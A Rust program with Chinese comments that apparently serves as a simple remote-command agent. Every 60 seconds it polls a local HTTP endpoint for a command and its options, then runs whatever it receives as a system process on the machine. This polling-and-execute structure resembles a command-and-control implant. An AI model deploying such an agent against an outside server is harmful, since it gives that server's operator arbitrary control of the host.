use reqwest::{self, Error};
use serde_json::{Value, Result as JResult};
use std::{collections::HashMap};
use std::thread;
use std::time::Duration;
use std::process::Command;

type CommandResponseResult = Result<CommandResponse, String>;

#[derive(Default, Debug)]
struct CommandResponse{
    cmd: String,
    idx: String,
    options: String, 
}

static mut _idx: u32 = 0; // 最近一次命令顺序
static mut _cmd: &str = ""; // 最近一次命令
const api_host: &str = "http://localhost:6677/api.php";

// 获取命令
async fn get_command() -> JResult<CommandResponse> {

    let presult = reqwest::get(api_host).await;

    if let Ok(pres) = presult {
        match pres.json::<HashMap<String, String>>().await {
            Ok(bs) => {
                println!("{:?}", bs);
                let cmd = bs.get("cmd").unwrap();
                let idx_opt = bs.get("idx");
                match idx_opt {
                    Some(idx) => {
    
                        let options = bs.get("options").unwrap();
    
                        if let Ok(num) = idx.parse::<u32>() {
                            unsafe {
                                if num > _idx {
                                    let cmd_res = CommandResponse{cmd: cmd.clone(), idx: idx.clone(), options: options.clone()};
                                    _idx = num; // 把更大的idx保存
                                    return Ok(cmd_res);
                                }
                            }
                        }
                    },
                    None => (),
                };
            },
            Err(err) => {
                println!("err: {:?}", err);
            },
        };
    }

    Ok(CommandResponse::default())

}

// 执行系统命令
fn run_cmd(cmd: &String, options: &String) -> String {
    match Command::new(cmd).args([options]).output() {
        Ok(output) => {
            return format!("{:?}", output);
        },
        Err(err) => {
            println!("执行命令出错: {:?}", err);
            String::new()
        },
    }
}

async fn loop_cmd() {
    loop {
        if let Ok(cmd_rs) = get_command().await {
            println!("收到命令{:?}", cmd_rs);
            if cmd_rs.cmd == "" {
                println!("命令指令不明");
            } else {
                run_cmd(&cmd_rs.cmd, &cmd_rs.options);
            }
        }

        thread::sleep(Duration::from_secs(60));
    };
}

#[tokio::main]
async fn main() {
    
    let cmd_listener = tokio::spawn(loop_cmd());
    tokio::join!(cmd_listener);
}